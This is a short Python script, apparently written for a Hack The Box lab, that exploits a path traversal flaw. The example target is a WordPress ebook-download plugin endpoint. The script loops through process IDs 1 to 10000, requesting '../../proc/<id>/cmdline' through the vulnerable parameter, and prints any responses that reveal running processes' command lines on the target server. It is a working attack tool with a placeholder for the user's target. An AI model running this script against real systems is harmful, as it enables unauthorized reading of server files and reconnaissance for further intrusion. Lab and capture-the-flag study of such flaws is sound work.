#Import requests to use GET and import re for RegEx
import requests
import re

#CHANGE THIS###################################################
url="http://vulnerable.website.com"
#EXAMPLE FORM HTB BACKDOOR (ebook vulnerability):
#url="http://IP-ADDRESS/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="

#see that the program started
print("searching:")

#for loop trough 1-10000 to look for IDs in this range
for i in range(1, 10000):
  #CHANGE THIS (tar_url) TO YOUR URL
  tar_url= url + "../../../../../../../proc/"+ str(i) +"/cmdline"
  #Makes the GET-Request and saves the content + length
  r = requests.get(tar_url)
  length_content = len(r.content)
  content = r.content

  #Prints out the important stuff 
  if(length_content > 150):
    print("-----------------------------------------------------------------------------")
    print("process found with length: " + str(length_content))
    print("URL: " + r.url)
    print("Result:", re.split("/cmdline/" , str(content)))
    print("-----------------------------------------------------------------------------\n")
    
#HF Looking fot the Process :>
